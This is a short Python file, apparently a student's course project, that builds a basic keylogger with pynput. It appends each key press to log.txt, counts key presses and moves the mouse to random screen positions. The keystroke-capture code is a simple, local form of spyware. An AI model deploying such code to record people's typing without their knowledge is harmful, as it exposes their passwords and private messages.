""" 
Sadia Plimley
CIS-30A Summer 2025
Final Project: Keylogger
Program Purpose: To monitor all user inputs on their device
and track them in a file. Additionally, organize the data to show statistics
on the user's inputs """

# ///// CONTROL FILE /////
# file purpose: to control and listen to mouse and keyboard

from pynput.mouse import Controller
from pynput.keyboard import Listener
import random 

key_press_count = 0

def ctrl_mouse(): # function moves user's mouse 
    mouse = Controller()
    mouse.position = (random.randint(10, 300),random.randint(10,400)) #puts mouse in top left of screen


# THE keylogger <3 writes all inputs down to log.txt
def writeToLog(key):
    letter = str(key)
    # //// cleaning up data
    letter = letter.replace("'","") #get rid of the '' around each key
    if letter == "Key.space":
        letter = ' '
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.shift" or letter == "Key.shift_l":
        letter = ""
    # ///// counting key presses
    global key_press_count
    key_press_count += 1
    
    
        
    with open("log.txt", "a") as log: #append file for logging user's inputs
        log.write(letter) #logs every key separately



    

